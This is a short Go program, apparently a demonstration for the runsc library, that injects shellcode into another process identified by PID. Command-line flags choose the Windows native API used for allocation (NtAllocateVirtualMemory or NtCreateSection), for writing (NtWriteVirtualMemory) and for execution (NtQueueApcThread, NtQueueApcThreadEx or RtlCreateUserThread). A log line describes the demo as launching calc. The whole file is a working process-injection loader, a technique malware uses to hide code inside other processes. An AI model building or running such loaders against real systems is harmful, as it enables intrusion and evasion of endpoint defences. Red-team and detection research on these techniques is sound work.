package main

import (
	hl "github.com/mjwhitta/hilighter"
	"github.com/mjwhitta/log"
	"github.com/mjwhitta/runsc"
)

func launch(sc []byte) error {
	var l *runsc.Launcher = runsc.New()

	switch flags.alloc {
	case "navm":
		l.AllocVia(runsc.NtAllocateVirtualMemory)
	case "ncs":
		l.AllocVia(runsc.NtCreateSection)
	default:
		return hl.Errorf("unsupported alloc method: %s", flags.alloc)
	}

	l.InPID(uint32(flags.pid))

	switch flags.run {
	case "nqat":
		l.RunVia(runsc.NtQueueApcThread)
	case "nqate":
		l.RunVia(runsc.NtQueueApcThreadEx)
	case "rcut":
		l.RunVia(runsc.RtlCreateUserThread)
	default:
		return hl.Errorf("unsupported run method: %s", flags.run)
	}

	l.Suspend(flags.suspend)

	switch flags.write {
	case "nwvm":
		l.WriteVia(runsc.NtWriteVirtualMemory)
	default:
		return hl.Errorf("unsupported write method: %s", flags.write)
	}

	log.Infof(
		"Launching calc in %d: %s->%s->%s",
		flags.pid,
		flags.alloc,
		flags.write,
		flags.run,
	)
	if e := l.Exe(sc); e != nil {
		return e
	}

	return nil
}
